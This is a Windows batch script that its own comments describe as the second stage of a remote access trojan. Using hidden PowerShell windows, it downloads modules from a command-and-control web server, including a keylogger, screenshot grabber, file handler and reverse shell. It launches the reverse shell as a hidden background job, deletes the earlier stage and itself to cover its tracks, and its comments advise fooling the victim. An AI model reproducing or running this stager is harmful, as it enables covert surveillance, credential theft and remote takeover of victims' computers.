@REM second stage of RAT

@REM variables
set "PATH_PHASE1=%1"
set "INITIAL_PATH=%cd%"
set "FILE_NAME=phase2.cmd"
set "MODULES_PATH=http://10.0.0.212:8000/modules"
set "TEMP_PATH=C:\Users\%username%\AppData\Local\Temp"
set "modulesName=scanner.ps1 screenshot.ps1 fileHandler.ps1 jobHandler.ps1 keylogger.ps1 reverse.ps1"

@REM Remove phase1
del %PATH_PHASE1%

@REM create folders to store our modules (it is ideal to give a random directory name to fool the victim)
cd %TEMP_PATH%
mkdir modules
cd modules

@REM download modules from our local web server
(for %%m in (%modulesName%) do (
   powershell -WindowStyle Hidden -c "Invoke-WebRequest -Uri %MODULES_PATH%/%%m -Outfile %%m"
))

TIMEOUT /T 10

@REM create a reverse shell connection back to our command and control center (powershell received from powercat module on github)
powershell -WindowStyle Hidden -c "Start-Job {Set-Location $using:PWD;powershell.exe -WindowStyle Hidden -c '. C:\Users\%username%\AppData\Local\Temp\modules\reverse.ps1'}"

@REM delete phase2
del %INITIAL_PATH%\%FILE_NAME%"
